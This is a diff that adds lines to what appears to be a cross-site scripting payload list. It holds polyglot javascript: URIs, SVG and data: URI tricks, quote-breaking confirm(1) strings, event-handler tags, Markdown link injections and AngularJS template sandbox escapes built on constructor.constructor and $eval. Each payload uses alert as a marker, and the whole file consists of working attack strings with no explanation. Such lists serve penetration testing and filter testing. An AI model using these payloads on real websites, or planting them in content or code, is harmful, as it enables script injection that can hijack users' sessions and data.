@@ -118,3 +118,21 @@ jaVasCript:/*-/*`/*`/*/*/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</tit
 <script>alert(document.domain)</script>uxldz Encod anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 { { alert(document.domain) } }
 ([,ﾠ,,,,ﾠﾠ]=[]+{},[ﾠﾠﾠ,ﾠ‌,ﾠﾠﾠﾠ,ﾠﾠ‌,,ﾠﾠﾠﾠﾠ,ﾠﾠﾠ‌,ﾠﾠﾠﾠﾠﾠ,,,ﾠﾠﾠﾠ‌]=[!!ﾠ]+!ﾠ+ﾠ.ﾠ) [ﾠﾠ+=ﾠ+ﾠﾠﾠﾠ‌+ﾠﾠﾠﾠﾠﾠ+ﾠﾠﾠ+ﾠ‌+ﾠﾠﾠﾠ+ﾠﾠ+ﾠﾠﾠ+ﾠ+ﾠ‌][ﾠﾠ] (ﾠﾠﾠﾠﾠ+ﾠﾠﾠ‌+ﾠﾠ‌+ﾠ‌+ﾠﾠﾠ+'`#JS!`')``
+<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
+<script src="data:,alert(1)%250A-->
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+\');confirm(1);//
+\');confirm(1);//
+'">><div><meter onmouseover="alert(1)"</div>"
+>><marquee loop=1 width=0 onfinish=alert(1)>
+[a](javascript:confirm(1)
+XSS[JavaScript:alert(1)]
+{{constructor.constructor('alert(1)')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+{{constructor.constructor('alert(1)')()}}
